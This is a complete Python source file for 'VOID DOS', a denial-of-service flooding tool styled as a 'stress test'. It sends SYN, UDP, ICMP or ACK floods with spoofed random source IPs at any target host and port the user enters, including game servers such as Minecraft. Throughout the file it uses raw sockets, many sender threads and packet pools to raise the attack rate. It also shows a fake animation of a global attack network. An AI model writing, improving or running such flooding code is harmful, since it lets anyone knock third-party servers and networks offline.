#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════
# ##  VOID Stress Test v2.1 — LAG-FREE EDITION
# ##  Non-blocking I/O + CPU yielding + Memory pools
# ══════════════════════════════════════════════════════════════════

import subprocess, sys, os

def _ensure_deps():
    for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet")]:
        try:
            __import__(mod)
        except ImportError:
            subprocess.check_call(
                [sys.executable,"-m","pip","install",pkg,"-q","--break-system-packages"],
                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

_ensure_deps()

import struct, socket, random, threading, time, re, select
from collections import deque
from functools import lru_cache
import ctypes
from rich.console import Console
from rich.text import Text
from rich.align import Align
from rich.rule import Rule
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich import box
import pyfiglet

console = Console()
stop_event = threading.Event()

# ══════════════════════════════════════════════════════════════════
# CONFIGURATION — TUNED FOR STABILITY + SPEED
# ══════════════════════════════════════════════════════════════════

# REDUCED: 128 threads thrash the CPU with context switches
# Use CPU count + 4 for I/O bound operations, or just 32-64 max
N_THREADS = min(64, (os.cpu_count() or 4) * 4)  
POOL_SIZE = 500      # Reduced from 1000 — less memory pressure
BATCH_REPORT = 250   # Increased batch size = fewer lock acquisitions
SOCKET_BUF_SIZE = 2 * 1024 * 1024  # 2MB is plenty
STATS_INTERVAL = 0.1  # 100ms = 10 FPS dashboard (was 50ms/20 FPS)

# CPU yield interval — CRITICAL to prevent freezing
YIELD_EVERY = 100    # Yield CPU every N packets

# ══════════════════════════════════════════════════════════════════
# PROCESS PRIORITY — Lower priority so system stays responsive
# ══════════════════════════════════════════════════════════════════

def set_low_priority():
    """Set process to lower priority so GUI stays responsive."""
    try:
        # Linux — nice value 10 (lower priority)
        os.nice(10)
    except:
        pass
    
    try:
        # Windows — BELOW_NORMAL_PRIORITY_CLASS
        if sys.platform == 'win32':
            import psutil
            p = psutil.Process(os.getpid())
            p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
    except:
        pass

# ══════════════════════════════════════════════════════════════════
# LOCK-FREE STATS — Atomic operations where possible
# ══════════════════════════════════════════════════════════════════

class LockFreeStats:
    """Stats with minimal locking using thread-local batching."""
    def __init__(self):
        self._lock = threading.Lock()
        self.sent = 0
        self.replies = 0
        self.errors = 0
        self.last_flag = ""
        self._start_time = time.time()
        self._last_time = self._start_time
        self._current_pps = 0.0
        
        # Thread-local batching — each thread accumulates locally
        self._local_batches = {}
        self._batch_lock = threading.Lock()
        
    def get_local_batch(self):
        """Get thread-local counter to reduce lock contention."""
        tid = threading.get_ident()
        with self._batch_lock:
            if tid not in self._local_batches:
                self._local_batches[tid] = 0
            return self._local_batches[tid]
            
    def add_sent_local(self, n: int = 1):
        """Add to thread-local batch."""
        tid = threading.get_ident()
        with self._batch_lock:
            self._local_batches[tid] = self._local_batches.get(tid, 0) + n
            
    def flush_local(self):
        """Flush thread-local batch to global counter."""
        tid = threading.get_ident()
        with self._batch_lock:
            val = self._local_batches.get(tid, 0)
            if val:
                self._local_batches[tid] = 0
                with self._lock:
                    self.sent += val
                    
    def add_sent_batch(self, n: int):
        with self._lock:
            self.sent += n
            
    def add_reply(self, flag_str: str = ""):
        with self._lock:
            self.replies += 1
            if flag_str:
                self.last_flag = flag_str
                
    def add_error(self):
        with self._lock:
            self.errors += 1
            
    def update_pps(self):
        now = time.time()
        with self._lock:
            elapsed = now - self._last_time
            if elapsed >= 0.5:  # Update every 500ms
                self._current_pps = (self.sent - (self.sent - int(self._current_pps * elapsed))) / elapsed
                self._last_time = now
                
    def get_pps(self) -> float:
        with self._lock:
            return self._current_pps
            
    def snapshot(self):
        # Flush all local batches first
        with self._batch_lock:
            total_local = sum(self._local_batches.values())
            with self._lock:
                effective_sent = self.sent + total_local
                return {
                    "sent": effective_sent,
                    "replies": self.replies,
                    "errors": self.errors,
                    "last_flag": self.last_flag,
                    "elapsed": time.time() - self._start_time,
                    "pps": self._current_pps
                }

# ══════════════════════════════════════════════════════════════════
# OPTIMIZED PACKET CRAFTING
# ══════════════════════════════════════════════════════════════════

def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# Pre-allocated pools
_RAND_IP_POOL = []
_RAND_PORT_POOL = []

def _init_pools():
    global _RAND_IP_POOL, _RAND_PORT_POOL
    # Smaller pools — refresh more often but less memory
    for _ in range(2000):
        a = random.randint(1, 223)
        while a in (10, 127, 169, 172, 192):
            a = random.randint(1, 223)
        _RAND_IP_POOL.append(f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
    _RAND_PORT_POOL = [random.randint(1024, 65535) for _ in range(2000)]

_init_pools()

def _get_rand_ip() -> str:
    return random.choice(_RAND_IP_POOL)

def _get_rand_port() -> int:
    return random.choice(_RAND_PORT_POOL)

def _ip_header(src_ip: str, dst_ip: str, proto: int, payload_len: int) -> bytes:
    ihl, ver, tos = 5, 4, 0
    tot_len = 20 + payload_len
    pkt_id = random.randint(0, 65535)
    ttl = random.randint(48, 128)
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    hdr = struct.pack('!BBHHHBBH4s4s',
        (ver << 4) | ihl, tos, tot_len, pkt_id, 0, ttl, proto, 0, src, dst)
    chk = _checksum(hdr)
    return struct.pack('!BBHHHBBH4s4s',
        (ver << 4) | ihl, tos, tot_len, pkt_id, 0, ttl, proto, chk, src, dst)

F_SYN, F_ACK, F_RST, F_FIN, F_PSH = 0x002, 0x010, 0x004, 0x001, 0x008

def _tcp_segment(src_ip: str, dst_ip: str, sport: int, dport: int, flags: int) -> bytes:
    seq = random.randint(0, 2**32 - 1)
    off = 5 << 4
    win = random.randint(1024, 65535)
    seg = struct.pack('!HHIIBBHHH', sport, dport, seq, 0, off, flags, win, 0, 0)
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 6, len(seg))
    chk = _checksum(pseudo + seg)
    return struct.pack('!HHIIBBHHH', sport, dport, seq, 0, off, flags, win, chk, 0)

def _udp_segment(src_ip: str, dst_ip: str, sport: int, dport: int) -> bytes:
    data = random.randbytes(32)  # Smaller payload
    length = 8 + len(data)
    seg = struct.pack('!HHHH', sport, dport, length, 0) + data
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 17, length)
    chk = _checksum(pseudo + seg)
    return struct.pack('!HHHH', sport, dport, length, chk) + data

def _icmp_packet() -> bytes:
    id_, seq = random.randint(0, 65535), random.randint(0, 65535)
    payload = random.randbytes(32)  # Smaller
    hdr = struct.pack('!BBHHH', 8, 0, 0, id_, seq)
    chk = _checksum(hdr + payload)
    return struct.pack('!BBHHH', 8, 0, chk, id_, seq) + payload

def _build_packet(mode_key: str, src_ip: str, dst_ip: str, sport: int, dport: int) -> bytes:
    if mode_key == "SYN":
        tcp = _tcp_segment(src_ip, dst_ip, sport, dport, F_SYN)
        return _ip_header(src_ip, dst_ip, 6, len(tcp)) + tcp
    elif mode_key == "ACK":
        tcp = _tcp_segment(src_ip, dst_ip, sport, dport, F_ACK)
        return _ip_header(src_ip, dst_ip, 6, len(tcp)) + tcp
    elif mode_key == "UDP":
        udp = _udp_segment(src_ip, dst_ip, sport, dport)
        return _ip_header(src_ip, dst_ip, 17, len(udp)) + udp
    elif mode_key == "ICMP":
        icmp = _icmp_packet()
        return _ip_header(src_ip, dst_ip, 1, len(icmp)) + icmp
    return b''

# ══════════════════════════════════════════════════════════════════
# LAG-FREE SENDER — Cooperative multitasking
# ══════════════════════════════════════════════════════════════════

def _build_pool(mode_key: str, target_ip: str, target_port: int, size: int) -> list:
    """Build packet pool."""
    return [_build_packet(mode_key, _get_rand_ip(), target_ip, _get_rand_port(), target_port) for _ in range(size)]

def _sender_lagfree(target_ip: str, target_port: int, mode_key: str, stats: LockFreeStats, thread_id: int):
    """Sender that yields CPU to prevent system freeze."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUF_SIZE)
        sock.setblocking(False)
        
        dst = (target_ip, 0)
        pool = _build_pool(mode_key, target_ip, target_port, POOL_SIZE)
        pool_idx = 0
        local_batch = 0
        total_sent = 0
        
        while not stop_event.is_set():
            try:
                pkt = pool[pool_idx]
                sock.sendto(pkt, dst)
                
                pool_idx = (pool_idx + 1) % POOL_SIZE
                local_batch += 1
                total_sent += 1
                
                # Batch report
                if local_batch >= BATCH_REPORT:
                    stats.add_sent_batch(local_batch)
                    local_batch = 0
                
                # CRITICAL: Yield CPU every YIELD_EVERY packets
                # This prevents the tight loop from freezing your PC
                if total_sent % YIELD_EVERY == 0:
                    # Use sleep(0) for cooperative yield (no actual delay)
                    time.sleep(0)
                    
                # Refresh pool periodically
                if total_sent % (POOL_SIZE * 100) == 0:
                    pool = _build_pool(mode_key, target_ip, target_port, POOL_SIZE)
                    pool_idx = 0
                    
            except BlockingIOError:
                # Buffer full — yield and retry
                time.sleep(0.001)  # 1ms backpressure
                if local_batch > 0:
                    stats.add_sent_batch(local_batch)
                    local_batch = 0
            except OSError:
                stats.add_error()
                time.sleep(0.001)  # Brief pause on error
            except Exception:
                continue
                
        if local_batch > 0:
            stats.add_sent_batch(local_batch)
            
        try:
            sock.close()
        except:
            pass
            
    except PermissionError:
        console.print("\n  [bold red][!][/]  Raw sockets need root — run with sudo\n")
        stop_event.set()
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════
# LIGHTWEIGHT LISTENER
# ══════════════════════════════════════════════════════════════════

def _listener_lagfree(target_ip: str, target_port: int, mode_key: str, stats: LockFreeStats):
    """Listener with cooperative yielding."""
    try:
        proto = socket.IPPROTO_TCP if mode_key in ("SYN", "ACK") else socket.IPPROTO_ICMP
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
        sock.setblocking(False)
        
        counter = 0
        while not stop_event.is_set():
            try:
                ready, _, _ = select.select([sock], [], [], 0.05)  # 50ms timeout
                if not ready:
                    continue
                    
                pkt, addr = sock.recvfrom(65535)
                counter += 1
                
                if addr[0] != target_ip:
                    continue
                    
                if proto == socket.IPPROTO_TCP:
                    ip_ihl = (pkt[0] & 0x0f) * 4
                    if len(pkt) < ip_ihl + 20:
                        continue
                    tcph = struct.unpack('!HHIIBBHHH', pkt[ip_ihl:ip_ihl+20])
                    if tcph[0] != target_port:
                        continue
                    flags = tcph[5]
                    flag_str = _decode_tcp_flags(flags)
                    stats.add_reply(flag_str)
                elif proto == socket.IPPROTO_ICMP:
                    if len(pkt) < 21:
                        continue
                    icmp_type = pkt[20]
                    if icmp_type == 0:
                        stats.add_reply("ECHO REPLY")
                    elif icmp_type == 3:
                        stats.add_reply("PORT UNREACH")
                
                # Yield every 100 packets processed
                if counter % 100 == 0:
                    time.sleep(0)
                    
            except BlockingIOError:
                time.sleep(0.001)
            except Exception:
                continue
                
        try:
            sock.close()
        except:
            pass
    except Exception:
        pass

def _decode_tcp_flags(flags: int) -> str:
    parts = []
    if flags & F_SYN: parts.append("SYN")
    if flags & F_ACK: parts.append("ACK")
    if flags & F_RST: parts.append("RST")
    if flags & F_FIN: parts.append("FIN")
    if flags & F_PSH: parts.append("PSH")
    return "+".join(parts) if parts else f"0x{flags:02x}"

# ══════════════════════════════════════════════════════════════════
# DASHBOARD — 10 FPS instead of 20
# ══════════════════════════════════════════════════════════════════

def _bar(ratio: float, width: int = 28, col: str = "bright_red") -> Text:
    filled = max(0, min(int(ratio * width), width))
    b = Text()
    b.append("█" * filled, style=col)
    b.append("░" * (width - filled), style="dim")
    return b

def _make_dashboard(target: str, port: int, mode: dict, stats: LockFreeStats) -> Panel:
    snap = stats.snapshot()
    pps = snap["pps"]
    sent = snap["sent"]
    reps = snap["replies"]
    errs = snap["errors"]
    elap = snap["elapsed"]
    last_f = snap["last_flag"]
    
    loss = ((sent - reps) / sent * 100) if sent else 100.0
    rate_ratio = min(pps / 100_000, 1.0)  # Scale to 100k pps
    reply_ratio = min(reps / max(sent, 1), 1.0)
    
    col = mode["color"]
    label = mode["label"]
    
    t = Table.grid(padding=(0, 2))
    t.add_column(); t.add_column(); t.add_column(); t.add_column()
    
    t.add_row(
        Text("TARGET", style="dim"), Text(f"{target}:{port}", style="bold yellow"),
        Text("MODE", style="dim"), Text(label, style=f"bold {col}"),
    )
    t.add_row(
        Text("SENT", style="dim"), Text(f"{sent:,}", style="bold white"),
        Text("RATE", style="dim"), Text(f"{pps:,.0f} pps", style="bold bright_red"),
    )
    t.add_row(
        Text("REPLIES", style="dim"), Text(f"{reps:,}", style="bold bright_green"),
        Text("LOSS", style="dim"), Text(f"{loss:.1f}%", style="bright_green" if loss < 20 else ("yellow" if loss < 60 else "bright_red")),
    )
    t.add_row(
        Text("THREADS", style="dim"), Text(f"{N_THREADS} active", style="bold white"),
        Text("UP", style="dim"), Text(f"{elap:.0f}s", style="bold white"),
    )
    
    if errs > 0:
        t.add_row(Text("ERRORS", style="dim red"), Text(f"{errs:,}", style="bold red"), Text(""), Text(""))
    
    rate_row = Text()
    rate_row.append("  RATE   ", style="bold white")
    rate_row.append_text(_bar(rate_ratio, col=col))
    rate_row.append(f"  {pps:,.0f} pps", style=f"bold {col}")
    
    rep_row = Text()
    rep_row.append("  REPLY  ", style="bold white")
    rep_row.append_text(_bar(reply_ratio, col="bright_green"))
    rep_row.append(f"  {reps:,}", style="bold bright_green")
    
    last_row = Text()
    if last_f:
        last_row.append("  LAST   ", style="bold white")
        last_row.append(f"{last_f}", style="bold yellow")
    else:
        last_row.append("  LAST   ", style="bold white")
        last_row.append("waiting...", style="dim")
    
    from rich.console import Group
    content = Group(t, Text(""), rate_row, rep_row, last_row, Text(""), Text("  [Ctrl+C to stop]", style="dim red"))
    
    return Panel(content, title=f"[bold bright_red]  VOID STRESS TEST v2.1 — LAG-FREE  [/]", border_style="bright_red", box=box.DOUBLE_EDGE)

# ══════════════════════════════════════════════════════════════════
# MAIN ATTACK LOOP
# ══════════════════════════════════════════════════════════════════

def run_attack(target: str, port: int, mode: dict):
    stats = LockFreeStats()
    mode_key = mode["key"]
    col = mode["color"]
    label = mode["label"]
    
    # Set lower priority so system stays responsive
    set_low_priority()
    
    # Spawn senders
    senders = []
    for i in range(N_THREADS):
        t = threading.Thread(target=_sender_lagfree, args=(target, port, mode_key, stats, i), daemon=True)
        t.start()
        senders.append(t)
    
    # Spawn listener
    lt = threading.Thread(target=_listener_lagfree, args=(target, port, mode_key, stats), daemon=True)
    lt.start()
    
    # Stats updater
    def _stats_updater():
        while not stop_event.is_set():
            stats.update_pps()
            time.sleep(0.1)
    threading.Thread(target=_stats_updater, daemon=True).start()
    
    # Live dashboard at 10 FPS (was 20)
    try:
        with Live(console=console, refresh_per_second=10, screen=False) as live:
            while not stop_event.is_set():
                panel = _make_dashboard(target, port, mode, stats)
                live.update(panel)
                time.sleep(0.1)
    except KeyboardInterrupt:
        stop_event.set()
        
    for t in senders:
        t.join(timeout=2.0)
        
    # Summary
    snap = stats.snapshot()
    sent = snap["sent"]
    reps = snap["replies"]
    elap = snap["elapsed"]
    loss = ((sent - reps) / sent * 100) if sent else 100.0
    pps_a = sent / elap if elap else 0
    
    console.print()
    console.print(Rule("[bold bright_red]  SESSION SUMMARY  [/]", style="bright_red"))
    console.print(f"  [dim]Target          [/]  [bold yellow]{target}:{port}[/]")
    console.print(f"  [dim]Mode            [/]  [bold {col}]{label}[/]")
    console.print(f"  [dim]Engine          [/]  [bold white]Lag-Free v2.1 · {N_THREADS} threads[/]")
    console.print(f"  [dim]Packets sent    [/]  [bold white]{sent:,}[/]")
    console.print(f"  [dim]Replies received[/]  [bold white]{reps:,}[/]")
    console.print(f"  [dim]Packet loss     [/]  [{'bright_green' if loss<20 else 'bright_red'}]{loss:.1f}%[/]")
    console.print(f"  [dim]Avg rate        [/]  [bold white]{pps_a:,.0f} pps[/]")
    console.print(f"  [dim]Duration        [/]  [bold white]{elap:.1f}s[/]")
    console.print()

# ══════════════════════════════════════════════════════════════════
# UI (unchanged from your original)
# ══════════════════════════════════════════════════════════════════

MAP_LINES = [
    "                                                                                  ",
    "       ┌───────────┐          ┌────────┐   ┌─────────────────────────┐  ┌─────┐  ",
    "       │           │          │        │   │                         │  │     │  ",
    "       │  N.AMER   │          │ EUROPE │   │         A S I A         │  │ JAP │  ",
    "       │           │          │        │   │                         │  └─────┘  ",
    "       │           │          └────────┘   │                         │           ",
    "       └───────────┘                       └─────────────────────────┘           ",
    "                                                                                  ",
    "       ┌───────────┐     ┌──────────┐                          ┌──────────────┐  ",
    "       │           │     │          │                          │              │  ",
    "       │  S.AMER   │     │  AFRICA  │                          │   OCEANIA    │  ",
    "       │           │     │          │                          │              │  ",
    "       └───────────┘     └──────────┘                          └──────────────┘  ",
    "                                                                                  ",
    "                                                                                  ",
    "                                                                                  ",
]

ATTACK_NODES = [
    (2, 10, "NAM"), (3, 14, "NAM"), (4,  8, "NAM"), (5, 12, "NAM"),
    (9,  9, "SAM"), (10,13, "SAM"), (11,  8,"SAM"),
    (2, 30, "EU"),  (3, 33, "EU"),  (4, 28, "EU"),
    (9, 27, "AFR"), (10,31, "AFR"), (11,25, "AFR"),
    (2, 46, "ASIA"),(3, 50, "ASIA"),(4, 43, "ASIA"),(5, 48, "ASIA"),
    (2, 62, "JAP"), (3, 64, "JAP"),
    (9, 58, "OCE"), (10,62, "OCE"), (11,55, "OCE"),
]

REGION_ORDER  = ["NAM","EU","ASIA","JAP","SAM","AFR","OCE"]
REGION_LABELS = {
    "NAM": "North America", "EU":  "Europe",
    "ASIA":"Asia",          "JAP": "Japan / Korea",
    "SAM": "South America", "AFR": "Africa",
    "OCE": "Oceania",
}

def _render_map(active: set) -> Text:
    grid = [list(row) for row in MAP_LINES]
    node_positions = {}
    for row, col, region in ATTACK_NODES:
        node_positions[(row, col)] = region in active

    txt = Text()
    for r, row in enumerate(grid):
        for c, ch in enumerate(row):
            if (r, c) in node_positions:
                txt.append("◉" if node_positions[(r, c)] else "·", style="bold bright_red" if node_positions[(r, c)] else "dim red")
            elif ch in "┌┐└┘─│":
                txt.append(ch, style="dim red")
            else:
                txt.append(ch, style="dim white")
        txt.append("\n")
    return txt

def show_geo_attack_map(target: str, mode_label: str, mode_color: str):
    console.print()
    console.print(Rule("[bold bright_red]  GLOBAL ATTACK NETWORK  [/]", style="bright_red"))
    console.print(f"  [dim]Deploying nodes across[/] [bold bright_red]7 regions[/] [dim]— target:[/] [bold yellow]{target}[/]")
    console.print()

    active = set()
    MAP_HEIGHT = len(MAP_LINES)

    for i, region in enumerate(REGION_ORDER):
        active.add(region)
        n = sum(1 for _, _, r in ATTACK_NODES if r == region)
        console.print(f"  [bright_red]▶[/]  [bold white]{REGION_LABELS[region]:<16}[/]  [bright_red]{n} nodes[/]  [bold bright_green][ ONLINE ][/]")
        map_txt = _render_map(active)
        console.print(Align.center(map_txt))
        time.sleep(0.3)
        if region != REGION_ORDER[-1]:
            sys.stdout.write(f"\033[{MAP_HEIGHT + 1}A")
            sys.stdout.flush()

    console.print()
    console.print(Rule("[dim red]  CONVERGENCE  [/]", style="dim red"))
    console.print()
    frames = [
        f"  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·  ·[/]  [bold yellow]◎ {target}[/]  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·  ·[/]",
        f"  [red]──  ──  ──  ──  ──  ──  ──[/]  [bold yellow]◎ {target}[/]  [red]──  ──  ──  ──  ──  ──  ──[/]",
        f"  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━━━[/]  [bold yellow]◎ {target}[/]  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━━━[/]",
        f"  [bold bright_red]█████████████████████████[/]  [bold yellow]◎ {target}[/]  [bold bright_red]█████████████████████████[/]",
    ]
    for frame in frames:
        console.print(frame)
        time.sleep(0.2)
    console.print()
    console.print(f"  [bold bright_red][!!!][/]  [bold white]ALL {len(ATTACK_NODES)} NODES LOCKED ON[/]  [bold yellow]{target}[/]  [bold {mode_color}]— {mode_label.upper()}[/]")
    console.print()
    console.print(Rule(style="bright_red"))

def banner():
    console.clear()
    fig = pyfiglet.figlet_format("V O I D  D O S", font="doom")
    txt = Text()
    shades = ["bright_red","red","bright_red","red","bright_red","red"]
    for i, line in enumerate(fig.splitlines()):
        txt.append(line + "\n", style=shades[i % len(shades)])
    console.print(Align.center(txt))
    console.print(Align.center(Text("lag-free edition  ·  cooperative threading  ·  v2.1\n", style="dim red")))
    console.print(Rule(style="bright_red"))

MODES = {
    "1": {"label": "SYN Flood",  "key": "SYN",  "color": "bright_red", "desc": "Fake TCP handshakes — fills connection table"},
    "2": {"label": "UDP Flood",  "key": "UDP",  "color": "bright_cyan", "desc": "Random UDP datagrams — bandwidth saturation"},
    "3": {"label": "ICMP Flood", "key": "ICMP", "color": "yellow", "desc": "Rapid ICMP echo requests — network overwhelm"},
    "4": {"label": "ACK Flood",  "key": "ACK",  "color": "bright_magenta", "desc": "Fake TCP acknowledgements — firewall confusion"},
}

def show_mode_menu():
    console.print()
    console.print(Rule("[dim red]  SELECT FLOOD TYPE  [/]", style="dim red"))
    console.print()
    for num, m in MODES.items():
        console.print(f"  [bright_red][{num}][/]  [bold {m['color']}]{m['label']}[/]")
        console.print(f"       [dim]{m['desc']}[/]")
        console.print()

def resolve(target: str) -> str:
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
        return target
    try:
        ip = socket.gethostbyname(target)
        console.print(f"  [dim]Resolved:[/]  [bold yellow]{target}[/] → [bright_white]{ip}[/]")
        return ip
    except Exception:
        return target

def main():
    if os.geteuid() != 0:
        banner()
        console.print(f"\n  [bold red][!][/]  Raw sockets need root.\n  [dim]Fix:  sudo python3 void_ddos.py[/]\n")
        return
        
    banner()
    console.print()
    
    console.print("  [bright_red]◈[/]  ", end="")
    target = input("Target IP or hostname: ").strip()
    if not target:
        console.print("  [red]No target. Abort.[/]"); return
    target = resolve(target)
    
    console.print("  [bright_red]◈[/]  ", end="")
    port_raw = input("Port (default 80, Minecraft = 25565): ").strip()
    port = int(port_raw) if port_raw.isdigit() else 80
    
    show_mode_menu()
    console.print("  [bright_red]◈[/]  ", end="")
    choice = input("Choice (1-4, default 1): ").strip()
    mode = MODES.get(choice, MODES["1"])
    
    console.print()
    console.print(Rule("[dim red]  CONFIRM  [/]", style="dim red"))
    console.print(f"  [dim]Target [/]  [bold yellow]{target}:{port}[/]")
    console.print(f"  [dim]Mode   [/]  [bold {mode['color']}]{mode['label']}[/]")
    console.print(f"  [dim]Engine [/]  [bold white]Lag-Free v2.1 · {N_THREADS} threads · COOPERATIVE[/]")
    console.print()
    console.print("  [bright_red]◈[/]  ", end="")
    confirm = input("Start? (Y/N): ").strip().lower()
    if confirm not in ("y", "yes"):
        console.print("\n  [yellow]Aborted.[/]\n"); return
        
    show_geo_attack_map(target, mode["label"], mode["color"])
    
    for i in range(3, 0, -1):
        console.print(f"\r  [bold bright_red][!][/]  [bold white]Firing in [bright_red]{i}[/]...[/]", end="")
        time.sleep(0.5)
    console.print(f"\r  [bold bright_red][!!!][/]  [bold bright_red]FIRING — {N_THREADS} THREADS — LAG-FREE MODE    [/]")
    console.print()
    
    try:
        run_attack(target, port, mode)
    except KeyboardInterrupt:
        stop_event.set()
        console.print("\n  [yellow]Stopped.[/]\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"\n  [bold red][!][/]  {e}\n")
